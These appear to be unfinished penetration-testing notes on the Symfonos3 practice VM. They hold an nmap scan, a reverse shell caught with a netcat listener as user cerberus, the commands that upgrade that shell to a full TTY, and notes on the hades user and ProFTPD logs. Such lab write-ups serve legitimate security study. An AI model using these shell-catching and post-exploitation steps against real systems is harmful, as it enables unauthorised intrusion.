# Symfonos3 Vuln VM

Kernel:
>Linux symfonos3 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64 GNU/Linux

## Nmap Scan
```
disastrpc notes 位 nmap -sV -sC -p- -T4 -oA nmap.allports 10.1.62.38                                                                                          
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-14 23:27 EST
Nmap scan report for 10.1.62.38
Host is up (0.00032s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:64:72:76:80:51:7b:a8:c7:fd:b2:66:fa:b6:98:0c (RSA)
|   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
|_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.73 seconds
```


## Local Enumeration

Elevate shell

```
disastrpc symfonos3 位 nc -nlvp 4242
listening on [any] 4242 ...
connect to [10.1.62.33] from (UNKNOWN) [10.1.62.38] 38166

whoami
cerberus

python -c 'import pty; pty.spawn("/bin/bash");'
cerberus@symfonos3:/usr/lib/cgi-bin$ ^Z
[1]+  Stopped                 nc -nlvp 4242
disastrpc symfonos3 位 stty raw -echo
nc -nlvp 4242fonos3 位 
             reset
reset: unknown terminal type unknown
Terminal type? ^C
cerberus@symfonos3:/usr/lib/cgi-bin$ export TERM=tmux-256color
cerberus@symfonos3:/usr/lib/cgi-bin$ export SHELL=/bin/bash
cerberus@symfonos3:/usr/lib/cgi-bin$ stty rows 39 columns 157
```

Findinds 
- .nano in /home/hades ??

Hades logged in to FTPD:

```
hades    ftpd22105    localhost        Sat Jul 20 03:47 - 03:47  (00:00)
hades    ftpd22075    localhost        Sat Jul 20 03:44 - 03:44  (00:00)
hades    ftpd22070    localhost        Sat Jul 20 03:43 - 03:43  (00:00)
```

ProFTPD is running as hades
>hades      370  0.0  0.4 124600  3716 ?        Ss   Nov14   0:00 proftpd: (accepting connections)

Check:
/var/log/proftpd/xferlog
/var/log/proftpd/proftpd.log
